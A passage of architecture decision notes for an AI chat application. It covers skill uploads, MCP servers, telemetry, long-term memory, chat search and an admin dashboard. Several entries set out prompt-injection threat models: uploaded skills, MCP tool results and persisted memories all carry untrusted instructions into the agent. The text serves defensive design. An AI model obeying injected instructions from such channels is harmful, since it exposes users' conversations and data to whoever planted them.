- Per-skill selectable tools (ADR 0048, amends 0021, follows 0026, **scope amended by ADR 0049**): each skill shipped in
  `src/Agent42.Agents/Skills/` is **individually selectable** in the ADR 0021 picker as a `skill:{name}` key
  (was one all-or-none `skills` checkbox). The bare `skills` key is repurposed into a **wildcard "all skills"**
  meta-key kept in `AllSelectableToolKeys` (so `null == all` and legacy selections keep enabling every skill —
  **zero migration**) but dropped from `Descriptors`. A new **`SkillCatalog`** discovers the shipped skills
  once per process from `AppContext.BaseDirectory/Skills`, **one directory at a time** — that is the whole
  filtering mechanism, because `AgentFileSkillsSource` treats each supplied path as a search root and a path
  pointing AT one skill directory yields exactly that skill (measured, 1.13.0; `AgentSkillsProviderBuilder.UseFilter`
  is **unusable** — `Build()` demands a script runner this app deliberately lacks). `BuildAgent` resolves the
  selected skills' **paths** and constructs the provider **only when that list is non-empty**. The skills
  portion of `GET /api/tools` was **per-deployment**, read from disk — ~~the interesting difference from ADR
  0026's per-user MCP portion~~; **ADR 0049 made it per-user too** (shipped ⊕ the user's uploads), so the
  two portions no longer differ in scope. Picker labels are the frontmatter `name` **verbatim** (`websearch`, not "Web
  search"). Four traps, all in gotchas: `GetEnabledToolsAsync` must **expand** the `skills` wildcard into
  `skill:{name}` keys (else a no-op Save silently disables every skill — the picker has no `skills` checkbox);
  the two expansions **compose in a fixed order**, `ExpandSkillsWildcard(ExpandMcpWildcard(…))`, because two
  `Assert.Equal` guards are order-sensitive; `renderToolChecks`'s `cb.checked` became a **three-way** OR (**four-way** since ADR 0058) whose
  MCP term is load-bearing and guarded only by a **source-text** assertion; and a skill whose frontmatter
  `name` disagrees with its directory name is **silently invisible** (the source returns `[]`, it does not
  throw). **Consequence worth knowing:** because the picker materialises "all" as the full explicit list, a
  skill added in a *later* release is **off** for anyone who ever pressed Save, while `BindAgentAsync` still
  snapshots the bare wildcard and *does* pick it up — the two paths diverge. Shell cache bumped
  `agent42-shell-v19` → `-v20`. Unlike ADR 0043 the manual DevHost leg **was** run (headless Chrome over CDP)
  and ADR 0048 records the observed values.
- Upload your own agent skills (ADR 0049, **amends 0048**: per-deployment → per-user): a signed-in user
  uploads a standalone `SKILL.md`, or a `.zip` of skill directories **with bundled resource files**, from
  **Preferences → Skills**, and it merges into the ADR 0048 picker as an ordinary `skill:{name}` key. One
  **normalized zip per skill** (single top-level directory = the frontmatter `name`) lives in a new
  `skill-packages` blob container; the index rides `agent-state` on a new `"user-skills"` state — **no new
  Cosmos container, no new secret, no RBAC step** (the Blob Data Contributor grant is account-scoped). A
  **fresh skill id on every upload, including a replace**, is what makes the materialized directory
  `{temp}/agent42-skills/{skillId}/{name}/` immutable and cache-invalidation-free; that tree is a **cache,
  not the record** (blob storage is durable, a restart wipes it) and it is `Path.GetTempPath()` because the
  Dockerfile's `USER $APP_UID` leaves `/app` unwritable. `BuildAgent` runs over a **merged** catalog
  (shipped ⊕ uploads, upload wins, `OrdinalIgnoreCase`) used by **both** the provider gate and
  `ExpandSkillsWildcard` — which **stops being `static`** and reads a new `_userSkills` field, re-opening
  the `OnActivateAsync` ordering hazard ADR 0048 said did not apply. Endpoints are `GET/POST/DELETE
  /api/skills` behind Easy Auth (**not** `excludedPaths` — ADR 0042's list is unchanged), with
  `ISkillPackageStore` resolved **optionally via `IServiceProvider`** (the `/api/speech` pattern) while
  `IUserSkillProvider` is a mandatory grain dependency in every silo. **Six framework facts were measured,
  and four of them corrected the plan** — read the two new gotchas before touching this: resource/script
  classification is by **extension at any folder**, so a `.py` under `references/` is a SCRIPT and a
  folder-keyed filter is worthless; skill-directory search is **hard-capped at depth 2** and `SearchDepth`
  does *not* raise it, so a double-wrapped zip yields nothing and the normalizer must walk for `SKILL.md`
  itself; `run_skill_script` is advertised **unconditionally** (safe only because it is approval-wrapped
  with no approval loop and no runner is registered); and `ValidateName` **accepts `con`/`aux`/`com1`**.
  Scripts are blocked twice — the normalizer drops them *and* the provider passes
  `AllowedScriptExtensions = []`. `DisableReadSkillResourceApproval = true` is a deliberate change (it is
  what makes bundled resources readable at all) and it creates a return path that **must** be budgeted:
  measured, a 300 KB SKILL.md makes `load_skill` return 300,087 chars, so `TruncatingSkillsProvider` caps
  both tools per `SkillToolLimits` (ADR 0004's 2 MB session). An upload **auto-enables** into a *non-null*
  stored default (else ADR 0048's "all is the full explicit list" rule leaves it silently OFF for anyone
  who ever pressed Save) — but per-conversation overrides and per-agent snapshots are deliberately **not**
  rewritten. **Two headline consequences:** an uploaded SKILL.md is untrusted instruction text entering the
  system prompt — a new **inbound prompt-injection channel** feeding ADR 0011/0027's exfiltration channel
  and ADR 0013's egress; and because an upload named after a shipped skill **wins**, uploading `websearch`
  replaces the only copy of the ADR 0011 mitigation text (an accepted residual — the upload response warns).
  Skills tab is appended **last** (index 5), so MCP stays 3 and the ADR 0025 OAuth return still works. Shell
  cache bumped `agent42-shell-v20` → `-v21`. The manual DevHost leg **was** run (headless Chrome over CDP)
  and ADR 0049 records the observed values — including the one thing it cannot show, since DevHost's canned
  chat client ignores the system prompt entirely.
- Google Calendar is GONE from this repo (ADR 0063, **supersedes 0053**): the six native calendar tools,
  the `/api/google/*` OAuth endpoints, both `Calendar/` folders, the `calendar` selection key and the
  `GoogleCalendar:*` config/Bicep/secrets were all **deleted**. The calendar is reached now like any other
  remote MCP server (ADR 0024) — a standalone `Calendar.Mcp` in the sibling repo `Expecho/mcpserver`, live
  at `https://google.agent42.nl/mcp` behind an `Mcp.Gateway` on the operator's own hardware, fronting
  Google with a stateless federating OAuth server. **ADR 0063 re-adopts an alternative ADR 0053 rejected
  twice and marked "neither is to be relitigated"** — that is an explicit user decision, and the premise
  that changed is "code that already lives in this process", which stopped being true once the calendar
  logic was wanted outside Agent42. Read 0063 before touching anything calendar-shaped. Four consequences
  worth carrying: Google tokens and the client secret now live **outside** Agent42; the calendar's tool
  results arrive through ADR 0024's inbound prompt-injection channel, with still **no confirmation gate**
  on writes; `CalendarSpanSuppressingHandler` is deleted but **the rule it served is not** (OTel never
  redacts a PATH — see gotchas, where the rule now outlives its worked example); and the
  `google-credentials` / `google-oauth-pending` documents are **orphaned in `agent-state`**, still holding
  DP-encrypted refresh tokens, cleanable only by hand. A stored `"calendar"` selection is silently dropped
  by `Sanitize` — harmless, no migration. ADR 0063 also settled a standing rule collision:
  `check-doc-paths.mjs` now skips ADRs whose front matter says **`status: superseded`** (keyed on that,
  never on `superseded_by:`, which ADR 0007 carries while still being authoritative). Shell cache bumped
  `agent42-shell-v29` → `-v30`.
- Live OpenTelemetry console at `/logs` (ADR 0054): a **standalone page** (three tabs — Traces / Logs /
  Metrics, `wwwroot/logs/`, mirroring `wwwroot/shared/`) polling a **bounded in-memory ring buffer** filled
  by in-process capture components in `src/Agent42.Backend/Telemetry/`. **No new datastore, container,
  secret, Cosmos container, grain, OTLP receiver, `excludedPaths` entry or Bicep change** — it is
  *consistent with* ADR 0031 rather than a supersession, because 0031 rejected **receiving** OTLP and this
  adds no receiver. One entry point, `AddLiveTelemetryCapture`, called by **both** hosts with different
  arguments: the Backend without instrumentation (`AddServiceDefaults()` already registered it — twice
  risks duplicate spans), **DevHost with** it and still **no exporter**, which is what makes the feature
  exercisable offline. **The headline consequence: this is the widest read surface in the app.**
  `EnableSensitiveData = true` means gen_ai spans carry **full prompt and completion text**, plus
  `user.*` identity, document excerpts and street addresses (ADR 0012) — and
  with **no role system**, any signed-in user reads **every** user's conversations. **It exposes incognito
  chats too** (ADR 0034 guarantees "not persisted, not listed", explicitly *not* "not in memory"). Chosen
  deliberately; and note span suppression never covered a tool's ARGUMENTS or RESULTS anyway — only the
  outbound HTTP span — so an MCP tool's calendar content still lands in `/logs` in full.
  Four things to read before touching this: **`LogRecord` is POOLED** — retaining one makes every buffered
  entry read back as the latest message, measured `count=2 distinctRefs=1`, and nothing throws;
  **`MetricType` has EIGHT members**, and 11 of 28 real instruments are `LongSumNonMonotonic`, so a
  five-arm switch reads `NaN` for 39% of the Metrics tab; the self-observation log filter **cannot be
  keyed off the category** (`Hosting.Diagnostics` is shared by every request — key off the path, two ways);
  and `wwwroot/logs/` is invisible to **both** frontend source-text guards, so `LogsConsoleAssetsTests`
  must fetch from the fixture `Client` directly and never call `GetAppScriptAsync()`. All four are in
  gotchas. The ring is bounded by **bytes as well as item count** (`gen_ai.input.messages` is the whole
  conversation, per turn, in a 1 GiB container) and **single replica is load-bearing** — `infra/main.bicep`
  pins `minReplicas = maxReplicas = 1`. **The Logs tab is legitimately EMPTY in production**
  (`Logging:LogLevel:Default` is `Warning` and `ILogger` filtering runs *before* the OTel processor, so no
  buffer setting can recover those records) — the tab reports the effective floor for exactly that reason;
  do not lower the level, which would also change what ships to the OTLP collector. No `sw.js` `CACHE`
  bump was due (the page is one **classic** script outside `wwwroot/js/`). The DevHost browser leg **was**
  run (headless Chrome over CDP) and ADR 0054 records the measured values — including the honest residual
  it cannot close: DevHost's canned chat client emits **no gen_ai spans**, so prompt-content capture is
  verifiable only in production.
- Long-term memory across conversations (ADR 0056, **amends ADR 0008**): a Hindsight memory bank per user
  — memories relevant to the user's message are recalled into the agent's **instructions** before each
  model call, and the turn's transcript is retained after it, with no MCP server and no tool the model has
  to call. It is a `AIContextProvider` attached in `BuildAgent` beside the RAG one, from a package **we
  publish**: `Hindsight.AgentFramework.Net`, an independent MIT port of Vectorize's Python
  `hindsight-agent-framework`, living in its own public repo
  (https://github.com/Expecho/Hindsight.AgentFramework.Net) so it is usable outside this codebase — which
  is also what discharges the upstream MIT attribution obligation this private repo could not.
  **Read the amendment before writing anything that cites ADR 0008 here:** 0008 lists "always-on but
  *ungated*" under Alternatives and **rejects** it; its per-conversation `DocumentNames.Count > 0` gate is
  the load-bearing property. Memory has no per-conversation analogue by design, so it takes the shape 0008
  refused, and the per-turn cost is **two third-party HTTP calls carrying conversation content** rather
  than one embedding round trip. Do not write "following ADR 0008".
  **The headline consequence is the widest egress in the app after ADR 0054's `/logs`:** with a key set,
  **every non-incognito turn** POSTs the user's message *and* the assistant's reply to a third party and
  sends the message again as a recall query — automatic, always-on, invisible in the UI, unlike ADR 0013
  (only when the user *picks* a third-party model) or ADR 0027 (only when the model *calls* fetch). It
  carries document excerpts and the user's street address (ADR 0012). Worse, and
  worth reading twice: because retain **persists** the transcript, a prompt injection landing once — an
  ADR 0027 followed link, an ADR 0024 MCP result, an ADR 0049 uploaded SKILL.md — becomes a **durable
  memory re-injected into every future conversation of that user**, with **no delete path** (out of scope,
  which is what makes it unmitigable rather than merely unmitigated). Hence off by default. **ADR 0057
  reversed the no-off-switch scope call:** memory is now a selectable `ToolCatalog` key (`memory`, ON by
  default, controllable at all three ADR 0021 layers), so `Hindsight:ApiKey` is the **operator's** switch —
  the only one that stops the egress deployment-wide — rather than the only switch there is. Deselecting
  stops future recall *and* retain and makes **zero** calls, but does **not** remove memories already
  retained: the no-delete-path residual is untouched.
  Optional secret, the `GOOGLE_MAPS_API_KEY` shape (`HINDSIGHT_API_KEY`; blank boots fine and attaches no
  provider, so a turn makes **zero** calls rather than failing ones). Incognito chats (ADR 0034) are fully
  excluded and **image-generation turns are too** (`RecordImageTurnAsync` builds its own agent with no
  providers) — but **reminder and agent-run turns are INCLUDED**, deliberately, so memory is written on
  turns with no user present. `Memory/` was the 19th Agents feature folder and `AgentGrain.Memory.cs` its
  12th partial (ADR 0061's `Search/` has since followed it, and ADR 0063's deletion of `Calendar/` has
  since renumbered both projects); `HindsightRegistration` makes `Memory/` a Backend folder — extracted there because
  adding the branch inline took `Program.cs` from 15 to 16 cognitive complexity and **failed the build**.
  Four things to read before touching it: the provider is built at **activation** while the incognito gate
  is **per-turn**, so it must be a delegate (`IsEnabled = () => !_ephemeral`), guarded by a test pair whose
  load-bearing half is `MemoryResumes_OnTheNormalTurnAfterAnEphemeralOne` (measured: it is the only one of
  the two that fails when the gate is stuck OFF as well as when it is captured); the ADR 0057 **selection**
  gate in the same method is the deliberate OPPOSITE — read at build time, as a value, because
  `SetEnabledToolsAsync`/`BindAgentAsync`/activation all rebuild, so do not "harmonise" the two (and note
  the **user-default** layer is still read once per activation, so switching memory off in Preferences
  reaches an already-warm chat only on its next activation); `InvokingContext` has **no `RequestMessages`** (a run's messages arrive on
  `AIContext.Messages`) and injected instructions neither come back in `InvokedContext.RequestMessages` nor
  accumulate across turns — both measured, both in gotchas; and the outbound span is deliberately **NOT**
  suppressed, a recorded exception to the path-suppression rule (a bank id is the opaque principal id, not an email
  address). The honest residual: **neither repo's tests ever reach a real Hindsight server**, and DevHost
  registers `HindsightIntegration(null)`, so the first real call happens in production.
- Search inside chat history (ADR 0061): a sidebar search box over a **plain-text projection of chat
  messages** in a new Cosmos container `chat-messages`, partitioned by **`/userId`** (not by
  conversation), so every query is single-partition and **owner-scoped by construction**. Port
  `IChatSearchIndex` (Agents `Search/`), Cosmos adapter + `ChatSearchIndexRegistration` (Backend
  `Search/`), `InMemoryChatSearchIndex` offline; `GET /api/search?q=` and `POST /api/search/reindex`,
  both **Easy-Auth gated — `excludedPaths` is unchanged** and the userId comes from `GetUserId()`,
  never a query parameter. **The projection is the whole point, not an optimisation:** Cosmos FTS
  indexes a *named string path*, and `SerializedSession` is one JSON blob per conversation, so
  indexing it would tokenize JSON keys (`messages`, `role`) alongside content and make "document"
  mean *whole conversation* — never try to index the grain-state container. The container ships
  **with** a full-text policy (`en-US`; **Dutch is not a supported FTS language** — it matches
  exactly but does not stem) even though **v1 queries with `CONTAINS`**, because the policy cannot be
  added after creation: BM25 later is then a query change, not a second backfill. Hybrid/RRF is the
  upgrade path and is **explicitly out of scope** — it would re-import ADR 0030's per-turn embedding
  round trip, *precisely* the shape ADR 0008 rejected. **Do not write "following ADR 0008":** 0008
  rejects "always-on but ungated" and this takes that shape deliberately, the distinction being that
  the per-turn work here is a **local upsert**, no third party and no new egress. What 0008 does bind
  is that **every index write is best-effort — own try/catch, logged, never rethrown**; the invisible
  gap that leaves is closed by reindex being **user-invocable and idempotent**. Four traps, all in
  gotchas: a **multi-property `ORDER BY` needs a `compositeIndexes` entry** or the query is a hard 400
  — which is how this shipped, broken in prod from day one, and it hid because writes are upserts (so
  the corpus filled fine while every read failed) and `search.js` renders a non-ok response as the same
  **"no matches"** row an empty result gives, so *read the status code of `/api/search` before
  theorising*; **ordinals must come from ONE `GetHistoryAsync()` projection** (both paths, or a
  live-then-reindex double-indexes); **an incognito turn stays in the in-memory session**, so skipping
  its write is *not* enough — the next normal turn re-projects it in unless the cursor is advanced
  past it (measured: the test fails without that); and **delete is a filtered query, never a
  partition drop**, because the partition is the user. Headline consequence: **a second copy of every
  message now exists at rest** — no new egress, but anyone reasoning about where conversation content
  lives (ADR 0035 share links, 0032's IndexedDB mirror, 0054's `/logs`) must now count this container.
  Two caveats worth knowing before relying on it: the index cursor is **activation-scoped**, so the
  first indexed turn of each activation re-upserts the **whole** conversation (write amplification,
  bought deliberately for self-healing); and **`POST /api/search/reindex` has no UI** — it is
  curl-only via `scripts/reindex-chat-search.sh` (Easy-Auth cookie in, batches of 25, resumable with
  `--skip`), and nothing backfills existing history on deploy, so the "user-invocable repair" the
  best-effort rule leans on stays a manual operator step.
  Shell cache bumped `agent42-shell-v25` → `-v26`. The DevHost browser leg **was** run (headless
  Chrome over CDP) and the AC16 guard was **mutation checked**. The Cosmos wire path is **prod-only**
  and unverified by CI, exactly as `CosmosDocumentIndex` has been since ADR 0007.
- Orleans dashboard at `/dashboard` (ADR 0062): the official `Microsoft.Orleans.Dashboard` mounted into
  the existing pipeline in **both** silo hosts, gated by Easy Auth (it is absent from `excludedPaths`,
  which is default-deny) **plus** a single-owner check. **Read this before typing a package name:** the
  community **`OrleansDashboard`** package must NEVER be referenced — 8.2.0 throws
  `MissingMethodException` out of `Silo.StartAsync` on Orleans 10.x, so the **silo never starts**, which
  in ACA is a crash-looping container that takes the whole app down (the `SEARXNG_SECRET` shape, not
  `GOOGLE_MAPS_API_KEY`'s); it also drags in a vulnerable `OpenTelemetry.Api` 1.9.0. It was deprecated in
  Nov 2025 and merged into `dotnet/orleans`, and `QualityGateTests` pins the ban on the exact
  `Include="OrleansDashboard"` string (a bare `Contains("Dashboard")` false-positives on the Microsoft
  one). **The rule is one rule, with no environment branch:** the request's user id must equal
  `Dashboard:OwnerOid`, **fail-closed** (blank denies everyone), compared `OrdinalIgnoreCase` (a GUID in
  different casing would otherwise 404 the dashboard for its own owner), denying with **404 not 403**.
  DevHost and the AppHost set that key to **`local-dev`** — exactly `CurrentUser.GetUserId()`'s
  no-principal-header fallback — so offline is open through the *same* rule; there is deliberately no
  `IsDevelopment()` branch. That makes **`local-dev` the one catastrophic value** for the key in
  `src/Agent42.Backend/appsettings.json`, where it would hand the dashboard to any unauthenticated
  request; a `//DANGER` comment and a negative test guard it. The gate is **middleware over the path
  prefix, not an endpoint filter** (the package maps its own routes, including a 3.5 MB asset route, and
  a security control must not rest on it propagating a convention) and is installed **before**
  `UseDefaultFiles`/`UseStaticFiles` — below them it works only while no `wwwroot/dashboard/` exists.
  **No infra change at all:** no `excludedPaths` entry (three new `EasyAuthExclusionTests` rows prove
  it), no Bicep, no secret, no Cosmos container; the owner OID is committed config, because an object id
  is an identifier not a credential. New Backend folder `Orleans/` (23 → 24, taken back to 23 by ADR 0063 — **not** `Dashboard/`, which
  collides with ADR 0031's "token-usage dashboard"), flat namespace as ever, endpoint groups stay **17** (**16** since ADR 0063)
  (the routes come from the package — deliberately not an `AgentApi.*` group). Registration is **split in
  two** so the gate half runs in a test with no silo, which is what keeps the coverage gate satisfiable.
  Measured consequences: it installs a `GrainProfilerFilter`, so **every grain call is profiled**
  including `AgentGrain`'s non-reentrant turn; ~16 MB image growth; and it opens **no listener of its
  own** (so the SearXNG sidecar cannot reach it on loopback — a real question, closed). **The
  same-origin question was measured, not argued:** "it only renders our own data" is **false** — reminder
  names are model-supplied and grain keys client-supplied — but payloads planted in both render inert
  (`&lt;img src=x …`, zero elements created, zero inline handlers, canary never fires), so no sandbox CSP
  is applied and the residual is bounded trust in a signed Microsoft package's escaping. This is
  **not** a third cross-user surface: unlike `/logs` (0054) and `/usage` (0031), it is one principal.
  Ships with the Orleans stack bumped **10.2.2 → 10.3.1**, whose exact cost was two tests — the
  collection-expression hazard's *message* moved (behaviour unchanged; do not soften that assertion),
  and a latent live-telemetry race the bump widened. **That race's standing explanation turned out to
  be WRONG, and both `gotchas.md` and `LiveTelemetryCollection` now carry the correction:** it is *not*
  gen_ai spans from classes missing `[Collection("LiveTelemetry")]` — adding the four remaining ones
  still left it 0/2 green under `--collect`. Measured, the contaminants are **`Microsoft.AspNetCore`
  server spans from the whole API test suite**, because `ConfigureOpenTelemetry()` subscribes to the
  ASP.NET instrumentation and an `ActivityListener` is process-global. **No collection can fix that —
  do not add a fifth class.** The fix is to **scope an emptiness assertion to the source under test**
  (4/4 green under `--collect` after). Shell cache bumped `agent42-shell-v26` → `-v27`.
  **`Dashboard:OwnerOid` currently ships BLANK, so the production dashboard denies everyone until it is
  filled in** — inert, not open, but `silo.AddDashboard()` is unconditional, so prod already pays the
  per-grain-call profiler and ~16 MB; ADR 0062's Unverified residual names the two ways to enable it.
- Quality gates are measurable or absent (ADR 0050): `.agentic/quality-gates.yaml` used to carry **five**
  gates of which **four had no measuring tool in the repo** — they are SonarQube "Clean as You Code"
  metrics and there is no Sonar here (`pr-checks.yml` said so itself, and `.agentic/optional-skills/sonar/`
  sits uninstalled). Three are now **deleted** (`new_issues`, `new_security_issues`, `duplication_pct_max`
  — `new_issues: 0` without a definition of "issue" is unfalsifiable); the two that remain are real.
  **`coverage_new_code_pct_min`** is enforced by `.agentic/scripts/check-new-code-coverage.mjs` in a new CI
  job — coverlet's cobertura report intersected with `git diff -U0` against the merge base, so it gates the
  lines a branch **added**, not the repo's overall number (`fetch-depth: 0` is load-bearing; a shallow
  checkout has no merge base and would silently gate nothing). **`cognitive_complexity_max`** is enforced at
  **build time** by `SonarAnalyzer.CSharp` rule **S3776** — a `GlobalPackageReference` (CPM's analyzer form,
  implies `PrivateAssets="all"`), no Sonar server, no token, no Java, no extra CI job. Three things to know
  before touching it: **cognitive ≠ cyclomatic** (`ChatCoreAsync` measured 29 cyclomatic against **39
  cognitive** — the figure that made it the worst of ADR 0051's eleven; it has since been split and is
  under the threshold), so
  the installed `dotnet-complexity` skill — which reads a `cyclomatic_complexity_max` key that deliberately
  does not exist here — is **informational only** and never scores this gate; **exactly ONE Sonar rule is
  adopted**, because the other ~400 produce ~300 warnings that fire on this repo's own idioms (S108 ×40 on
  `catch { /* best effort */ }`, S125 ×30 on its dense comments), so `.editorconfig` defaults every analyzer
  diagnostic to `none` and re-enables S3776 alone; and the **threshold is the analyzer's built-in default of
  15**, which is why the yaml can say 15 with no second number to drift — it is settable only via a
  `SonarLint.xml` `AdditionalFiles` entry, **not** `.editorconfig` (silently ignored, measured), and
  `QualityGateTests` fails if the two ever disagree. **The gate BLOCKS (ADR 0051):** S3776 is at `error` in
  `.editorconfig`, so a method over 15 fails `dotnet build` outright — ADR 0050 shipped it as a `warning`
  only because eleven methods already exceeded it, and ADR 0051 cleared that backlog. Expect to meet it: a
  feature that adds one `if`/`else` to `Program.cs` can tip the composition root over on its own, and the
  answer is the `DocumentIndexRegistration` / `HindsightRegistration` one — lift that feature's registration
  into its own folder — never a ternary that buys the metric and costs the reader. The trap that cost a
  wrong answer once already: **S3776 ships at `info` severity**, so a build that does not set it explicitly
  reports zero violations however many exist.
- Per-agent API key + async run (ADR 0022): each stored agent has a **per-agent API key** (minted on
  create, **shown once**, only its **SHA-256 hash** stored on `AgentDefinition [Id(9)]`, **regenerate**-on-edit)
  and a fire-and-forget **`POST /api/agent-run`** — `multipart/form-data` (a `prompt` field + optional `file`
  parts) + `X-Api-Key` header — that lets external automation (webhook/cron/n8n) run a **specific** agent with
  no browser session. The **key alone** identifies the agent via a global **key-hash → `(userId, agentId)`
  directory grain** (`IAgentKeyDirectoryGrain`, the one cross-user structure; rides `agent-state`, no new
  container); it responds **202** and runs in the **background** (`[OneWay] EnqueuePromptAsync`) into a new
  *listed* conversation the owner opens later. Files reuse the browser pipelines (images → `IAttachmentStore`;
  documents → `DocumentIngestionService` + RAG); a batch with any bad file is **rejected whole (400)**. A new
  **`excludedPaths: ['/api/agent-run']`** Easy-Auth carve-out (`container-app.bicep`, **amends ADR 0002**) is
  the **only** infra change — no new secret. Four things to read before touching this: the directory must be
  kept in sync **per-operation** (regenerate deregisters the OLD hash first) or a revoked key stays live; an
  `excludedPaths` endpoint is **publicly reachable** and must self-enforce + fail closed (userId from the
  directory, **never** `GetUserId`); the background run **drains `ChatCoreAsync`** (not the attachment-blind
  reminder path) so images/image-gen/RAG work — tests **poll** because it's `[OneWay]`; and **`ApiKey`** is
  the single place that generates *and* hashes. All in gotchas. **Headline consequence:** `/api/agent-run` is
  a new **inbound** vector for ADR 0013's egress — a key holder can push a prompt, **image bytes** and
  **document content** that, on a third-party model, leave the Entra tenant.
- Web Share Target (ADR 0023): an installed PWA appears in Android's system **Share sheet** and receives
  shared text/URL/images/documents. **Android/Chromium only** — iOS PWAs can't register as share targets.
  The manifest declares a `share_target` (`POST /share`, multipart), but there is **no server `/share`
  route and no `excludedPaths`/Bicep change** — the deliberate contrast with ADR 0022. The **service
  worker intercepts `POST /share` client-side**, stashes the payload in **IndexedDB**, and 303-redirects to
  a GET landing (`/?share=1`); the POST never hits the network, so Easy Auth (ADR 0002, `RedirectToLoginPage`)
  never sees it and can't drop the body on a login redirect. `sharetarget.js` reads the stash on load, opens a
  **per-share destination picker** (new chat / an agent, incl. continuous — ADR 0016), prefills the composer
  and runs shared files through the existing `handleFiles` upload path (images → attachments, documents →
  RAG), then the user **reviews and sends it themselves — never auto-sent** (egress consent, ADR 0013;
  the send control is **Enter**, not a button — ADR 0043). Two things to read before touching this: the share `respondWith` must sit **after** the `/api` guard and **before**
  the non-GET early-return, and the SW must be **active** for the share to work (else the POST reaches the
  server and fails — accepted degradation, no server fallback). Both are in gotchas. **Headline consequence:**
  sharing is a new **inbound** vector for ADR 0013's egress, and sharing a large file into a **continuous**
  agent is a new low-friction path to the 2 MB grain brick (ADR 0016/0004).
- Config-driven remote MCP servers (ADR 0024): a signed-in user adds their own **remote HTTP MCP servers**
  (Preferences → MCP servers) and their tools appear to the agent with **no per-server code** — every MCP
  server speaks the same discovery protocol and its tools convert to `AITool` (`McpClientTool`), merging into
  the `List<AITool>` `AgentGrain.BuildAgent` already builds. It is the MCP analogue of user-configurable
  model providers (ADR 0018): a per-user overlay grain (`IUserMcpConfigGrain`, riding `agent-state` on a new
  `mcp-servers` state — **no new Cosmos container**), secrets **encrypted** via a dedicated
  `IMcpSecretProtector` (own DP purpose), masked to `hasHeaderValue` on read, blank-on-update = keep. A
  singleton `IUserMcpToolProvider` connects to the user's enabled servers (version-cached, best-effort with a
  timeout) and `AgentGrain` resolves the tools **once in `OnActivateAsync` before the first `BuildAgent`**,
  gated **per server** (ADR 0026 amends this: was a single `mcp` group key) — each server kept when the
  selection contains the `mcp` **wildcard** or the server's `mcp:{id}` key (`ToolCatalog.IsMcpServerEnabled`),
  intersected with capability. Auth is **staged by risk**, all shipped: None/Header (Phase 1), MSAL
  ClientCredentials (Phase 2, the Entra ID → Dataverse path — a dynamic token stamped by an `AuthHeaderHandler`
  over a plain `HttpClient`), and **InteractiveOAuth (Phase 3, ADR 0025)** — an app-driven authorization-code +
  PKCE flow with **PRM discovery** across `GET /api/mcp/oauth/start` + `/callback` (both **behind Easy Auth**,
  never `excludedPaths`), tokens persisted **encrypted** in `StoredMcpServer.TokenCiphertext` and refreshed at
  connect. The SDK's OAuth is NOT used (its redirect delegate blocks). Manual prereq: register the redirect URI
  `https://chat.agent42.nl/api/mcp/oauth/callback` in each provider's app registration. **Every host that maps
  `MapAgentApi` must register `IMcpSecretProtector`** (a route-matcher dependency) and every silo that
  activates `AgentGrain` must register `IUserMcpToolProvider`. Four things to read before touching this: the
  tool provider's cache holds **live sockets** so it is bounded (not the unbounded provider-cache copy); MCP
  tools are the **per-server-gated exception** to the catalog-key guard (dynamic names, absent from the catalog
  map); the endpoint is deliberately **not SSRF-guarded** (config, not a request — may be `localhost`); and a
  tool's **return value is persisted** into the 2 MB session so each is truncation-wrapped (ADR 0004). All in
  gotchas. **Headline consequence:** an MCP server sees conversation content and its tool results are a new
  inbound prompt-injection channel — ADR 0013's egress, reached from a server the user added.
- Per-MCP-server selectable tools (ADR 0026, amends 0024/0021): each management-enabled MCP server is
  **individually selectable** in the ADR 0021 picker as an `mcp:{serverId}` key (was one all-or-none `mcp`
  checkbox). The bare `mcp` key is repurposed into a **wildcard "all servers"** meta-key kept in
  `AllSelectableToolKeys` (so `null == all` and legacy selections keep enabling every server — **zero
  migration**) but dropped from `Descriptors`. `GET /api/tools` is now **per-user** for the MCP portion
  (appends one descriptor per enabled server). Two traps: `GetEnabledToolsAsync` must **expand** the `mcp`
  wildcard into `mcp:{id}` keys before the picker sees it (else a no-op Save silently disables every server —
  the picker has no `mcp` checkbox), and the provider emits an **empty group per skipped server** so the
  expansion id-list is complete. Both in the null==all gotcha.
- Per-MCP-TOOL selectable tools (ADR 0058, amends 0026, re-scopes 0021 again): each tool of a server is
  individually selectable as `mcp:{serverId}:{toolName}` — a **third level** under `mcp` ⊃ `mcp:{id}` ⊃
  `mcp:{id}:{tool}`, any of which grants a tool (`ToolCatalog.IsMcpToolEnabled`, which subsumes
  `IsMcpServerEnabled`). `mcp:{id}` keeps its exact ADR 0026 meaning, so **zero migration**; `Sanitize` and
  `IsMcpServerKey` need **no change** because a per-tool key is a per-server key plus a segment, and
  **nothing anywhere parses a key**. This is the third instalment of ADR 0026's shape (0048 did skills) but
  **not** a copy of either: those gate over a list knowable locally, while **MCP tool names are only knowable
  by connecting**, and every hard part follows from that. Names are persisted on a trailing
  `StoredMcpServer [Id(12)] KnownToolNames` — **discovered metadata, never a user setting** — recorded by the
  provider after a **successful** connect via a **non-bumping** `RecordToolNamesAsync` (bumping would tear
  down the live-socket cache for every warm grain), preserved across a server edit by a `Keep` clause in
  `SaveAsync` (**the single easiest way to ship this broken** — `ToStored` rebuilds the record from a request
  that carries no names), and carried to the grain on `McpServerTools.KnownToolNames` so the picker and the
  gate are **one source** (a divergence mints keys with no checkbox that the next Save drops). `GET
  /api/tools` reads those names and **never calls `IUserMcpToolProvider`**: connecting would cost ~10 s per
  dead server sequentially, and an OAuth refresh would turn the GET into a **write** — a rule **ADR 0064 left
  intact**. Its headline consequence was that a newly added server had no per-tool checkboxes until that
  user's next chat activation; **ADR 0064 narrowed that** to "…until the next chat activation **or the user
  presses Test**" (its master checkbox works throughout either way, so only granularity waits; the picker
  says "tools not discovered yet").
  Four traps, all in gotchas: never expand `mcp:{id}` into an **empty** set (both master states are then
  wrong — one silently disables the server, the other silently re-grants deselected tools); the picker must
  partition on **`ToolDescriptor.ParentKey`**, not `startsWith("mcp:")`, which matches both row kinds;
  `cb.checked` is now a **four-way** OR whose new term is the parent key; and the disclosure must be a
  `<button>`, since `readToolChecks` sweeps every checkbox into the saved keys. Two client rules have **no
  runtime test** and are guarded only by source text — the **collapse** rule (an all-ticked server saves as
  bare `mcp:{id}`, so it still picks up tools added later) and the **preservation** rule (per-tool keys for
  unrendered servers carried forward over a **per-container `WeakMap`**); both were verified over CDP and the
  second was **mutation checked** (removing it makes an unrelated toggle silently destroy the selection).
  Egress is **unchanged** (ADR 0024/0013) — selection only narrows. Shell cache bumped `agent42-shell-v23` →
  `-v24`. The DevHost browser leg **was** run and ADR 0058 records the measured values.
- Test an MCP server's connection (ADR 0064, **amends 0024/0026/0058**): after adding or editing a remote MCP
